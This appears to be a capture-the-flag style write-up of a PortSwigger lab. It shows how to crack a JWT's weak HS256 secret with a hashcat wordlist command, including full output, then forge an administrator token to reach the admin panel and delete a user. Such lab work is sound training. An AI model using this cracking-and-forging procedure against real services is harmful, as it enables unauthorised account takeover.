## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/a479b2ff-0067-4ce9-b2a2-18d6819d6e36)

## Overview :

When implementing JWT applications, developers sometimes make mistakes like forgetting to change default or placeholder secrets. They may even copy and paste code snippets they find online, then forget to change a hardcoded secret that's provided as an example. In this case, **it can be trivial for an attacker to brute-force a server's secret using a wordlist of well-known secrets.**

Hashcat command to bruteforce secret keys -

```bash
 hashcat -a 0 -m 16500 <jwt> <wordlist>
```

## Solution :

Login as wiener using the provided credentials.

In the *HTTP history* tab , we can see that the 3 following requests have JWT.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/43fbce2f-5129-42d7-9f0d-65bfc6cc4171)

Send one of the requests to repeater tab. It has the following JWT token.

```
eyJraWQiOiJjYTlmYmExMy1kZjIyLTRlMTEtODA1OC01YWU1ZDU4MDlkY2QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTYzODQ3MH0.RxzNzDUjrkrCXxv2whRlhcdZF-ObfpUiTLUifY_MU58
```
**Header -**

```json
{
  "kid": "ca9fba13-df22-4e11-8058-5ae5d5809dcd",
  "alg": "HS256"
}
```

**Payload -**

```json
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1695638470
}
```

### Bruteforce the secret using hashcat -

With the help of hashcat , we were able to find the secret key used in the JWT.

```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -a 0 -m 16500 eyJraWQiOiJjYTlmYmExMy1kZjIyLTRlMTEtODA1OC01YWU1ZDU4MDlkY2QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTYzODQ3MH0.RxzNzDUjrkrCXxv2whRlhcdZF-ObfpUiTLUifY_MU58 jwt.secrets.list 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-10310U CPU @ 1.70GHz, 1436/2936 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: jwt.secrets.list
* Passwords.: 103271
* Bytes.....: 1203512
* Keyspace..: 103261
* Runtime...: 0 secs

eyJraWQiOiJjYTlmYmExMy1kZjIyLTRlMTEtODA1OC01YWU1ZDU4MDlkY2QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTYzODQ3MH0.RxzNzDUjrkrCXxv2whRlhcdZF-ObfpUiTLUifY_MU58:secret1
```

So the secret used here is - **secret1**.

### Modify the JWT & Re-sign it -

1. In the Payload section, change `"sub": "wiener"` to `"sub": "administrator"` .
2. Go to **JWT Editor**, and specify the secret-key which we found - `secret1`
   ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/0ac41f56-d0c4-4fa8-908a-2f8b2f0d088b)
3. Now go to *JSON WEB TOKEN* tab & sign the key.
   ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/8997a258-237e-4480-a8e8-982eba0e1c1e)

This is the resulting JWT token.

```
eyJraWQiOiJjYTlmYmExMy1kZjIyLTRlMTEtODA1OC01YWU1ZDU4MDlkY2QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTU2Mzg0NzB9.6x0sGjULyvW10Bc-Qmgv68TtfCRD9xd9GBIBlt5Lt68
```

Replace the original token with the one we just created & forward the request.

Now we can see the link to admin panel.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/deb48201-f88d-4cad-9c22-3f515cbd8382)

Delete the user carlos to solve the lab.

![Uploading image.png…]()

